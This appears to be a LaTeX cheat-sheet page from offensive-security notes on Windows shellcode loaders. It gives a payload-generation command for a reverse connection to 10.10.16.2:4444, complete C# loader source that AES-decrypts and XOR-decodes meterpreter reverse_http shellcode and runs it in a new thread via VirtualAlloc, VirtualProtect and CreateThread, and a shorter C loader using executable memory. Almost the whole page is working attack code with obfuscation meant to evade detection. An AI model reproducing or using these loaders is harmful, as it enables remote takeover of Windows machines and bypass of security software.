
\section{ShellCode loader}

\begin{verbatim}
python micr0\ shell.py --ip 10.10.16.2 -p 4444 --language csharp
\end{verbatim}

\subsection{Thread injection}

\begin{verbatim}
using System;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Cryptography;

namespace ShellCodeLoader
{
    internal class ShellCodeLoader
    {
        [DllImport("kernel32")]
        private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr, uint size,
            uint flAllocationType, uint flProtect);

        [DllImport("kernel32")]
        private static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize,
            uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32")]
        private static extern IntPtr CreateThread(uint lpThreadAttributes,
            uint dwStackSize, IntPtr lpStartAddress, IntPtr param,
            uint dwCreationFlags, ref uint lpThreadId);

        [DllImport("kernel32")]
        private static extern uint WaitForSingleObject(IntPtr hHandle,
            uint dwMilliseconds);

        public static void DisplayBuf(byte[] buf)
        {
            var hex = string.Empty;
            buf.ToList().ForEach(b => hex += b.ToString("x2"));
            Console.WriteLine(hex);
        }

        public static byte[] Xor(byte[] b, byte k)
        {
            var i = 0;
            while (i < b.Length)
            {
                b[i] = (byte)(b[i] ^ k);
                i++;
            }

            return b;
        }

        public static byte[] UncryptBuf(string bufEnc, byte[] key, byte[] iv)
        {
            var aes = Aes.Create();

            var decryptor = aes.CreateDecryptor(key, iv);
            byte[] buf;
            using (var msDecrypt =
                   new MemoryStream(Convert.FromBase64String(bufEnc)))
            {
                using (var csDecrypt = new CryptoStream(msDecrypt, decryptor,
                           CryptoStreamMode.Read))
                {
                    using (var msPlain = new MemoryStream())
                    {
                        csDecrypt.CopyTo(msPlain);
                        buf = msPlain.ToArray();
                    }
                }
            }

            return buf;
        }

        private static void Main(string[] args)
        {
            // Shellcode (msfvenom -p windows/x64/meterpreter/reverse_http LHOST=... LPORT=... -f csharp)


            // Shellcode (msfvenom -p windows/x64/meterpreter/reverse_http
            //              LHOST= ... LPORT=... -f csharp)
            // xor buffer and decode
            //byte[] buf = {< SNIP > };
            //buf = Xor(buf, 0x5c);

            // aes base64ed string and decode
            byte[] buf;
            var key = new byte[16]
            {
                0x1f, 0x76, 0x8b, 0xd5, 0x7c, 0xbf, 0x02, 0x1b, 0x25, 0x1d,
                0xeb, 0x07, 0x91, 0xd8, 0xc1, 0x97
            };
            var iv = new byte[16]
            {
                0xee, 0x7d, 0x63, 0x93, 0x6a, 0xc1, 0xf2, 0x86, 0xd8, 0xe4,
                0xc5, 0xca, 0x82, 0xdf, 0xa5, 0xe2
            };
            // aes
            //string bufEnc = "vET7JrlOiNB5nQ7lxuOvQ4ZVhPdvHea6Tq17mxavrSCUIQ2puXctZ5uFJ1efqQrfskWTmI3dHFrTx/jQujzhbrHtBf05LMuFUlw5PFFqvMlxV/+volczXJJucCmJPkfIh3Fhog72Cg7M6NVEir0RMFCZV8ERkNZErWYYOEA9yI9imTw9rSCxYulTU1q2J/Jcbsm1OFxVogXkS/aTR6P0qM7FD2KEjKRUck7dI4InXrDcluvSzIfnLji0i5P8hAbV6hBsG/Gnu7vloC7JdoF+QSOFXv3nEMFsQuPnxq5lEUWF0PD1wQ6GtvbeOxY1Z581FepjleC9NdZETLOn9lRopx08/TugE1V0r4SaDlAULqT8gz0xqlgsBBh951SIKpKV0EM0RX6Hhy6gsKDUI2Gk0QG00V4cmw8jNsWTEgmaUap2XsxthSysocWqzkaGP8RtpRjlGSz2pBGKoBIBlJtdRDrXPb2tND+6TTY4k13ZSPnfg+A/cy/nP3ZJshQrrUns9j/ARteus3pvGK8CxeQm6gzKDDv+5CmaI56MU/2Oq5OA8Bp6LGDedd/dLL6BJPK06nefXgWJ7+FBWl9eOcAX91mY1637kgTlmK27qknUQ9CfQzB9cn20tdtzHw34JqGufYRfM6mxzWfHKZwoyNtRC01faVKYprHA4ZJ/ru9wnDU=";
            // 192.168.2.3 4444
            //bufEnc =
            //    "vET7JrlOiNB5nQ7lxuOvQ4ZVhPdvHea6Tq17mxavrSCUIQ2puXctZ5uFJ1efqQrfskWTmI3dHFrTx/jQujzhbrHtBf05LMuFUlw5PFFqvMlxV/+volczXJJucCmJPkfIh3Fhog72Cg7M6NVEir0RMFCZV8ERkNZErWYYOEA9yI9imTw9rSCxYulTU1q2J/Jcbsm1OFxVogXkS/aTR6P0qM7FD2KEjKRUck7dI4InXrDcluvSzIfnLji0i5P8hAbV6hBsG/Gnu7vloC7JdoF+QSOFXv3nEMFsQuPnxq5lEUWF0PD1wQ6GtvbeOxY1Z581FepjleC9NdZETLOn9lRopx08/TugE1V0r4SaDlAULqT8gz0xqlgsBBh951SIKpKV0EM0RX6Hhy6gsKDUI2Gk0QG00V4cmw8jNsWTEgmaUap2XsxthSysocWqzkaGP8Rtr1wVKLeFgydbsGS8UYDAmsrs6o0q5LB+h0QomkqfuJ2zlHsl6e95P7xfa2JuIy1y6FRfLz3e/4Vp3S1gG8WMMF2L/LXXZsdXVlO5Kp8NDaXab9jlq2MAefvLiWGx4FteUPpwiUFGv5NtMBqstxhkjdFoulTcUdpJutCkg2eMywj2vFLPmlH/1If/MVSAMHr68aINgQLHeh2UFd4yUp2VFq6mBPNsOhpZmKfgnmPycBw=";
            //xor and aes
            var bufEnc =
                "<HERE>";
            var xorBuf = UncryptBuf(bufEnc, key, iv);
            buf = Xor(xorBuf, 0x5c);
            //DisplayBuf(buf);

            // Allocate RW space for shellcode
            var lpStartAddress =
                VirtualAlloc(IntPtr.Zero, (uint)buf.Length, 0x1000, 0x04);

            // Copy shellcode into allocated space
            Marshal.Copy(buf, 0, lpStartAddress, buf.Length);

            // Make shellcode in memory executable
            uint lpflOldProtect;
            VirtualProtect(lpStartAddress, (uint)buf.Length, 0x20,
                out lpflOldProtect);

            // Execute the shellcode in a new thread
            uint lpThreadId = 0;
            var hThread = CreateThread(0, 0, lpStartAddress, IntPtr.Zero, 0,
                ref lpThreadId);

            // Wait until the shellcode is done executing
            WaitForSingleObject(hThread, 0xffffffff);
        }
    }
}
\end{verbatim}


Note in \verb+c+:
\begin{verbatim}
#include "windows.h"
#include "stdlib.h"

unsigned char shellcode[] = {
  0xfc, 0x48, 0x83, 0xe4, 0xf0......};  // SHELLCODE HERE

int main()
{
    int length = sizeof(shellcode);
    void* exec = VirtualAlloc(0, length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    RtlMoveMemory(exec, shellcode, length);
    HANDLE th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec, 0, 0, 0);
}
\end{verbatim}


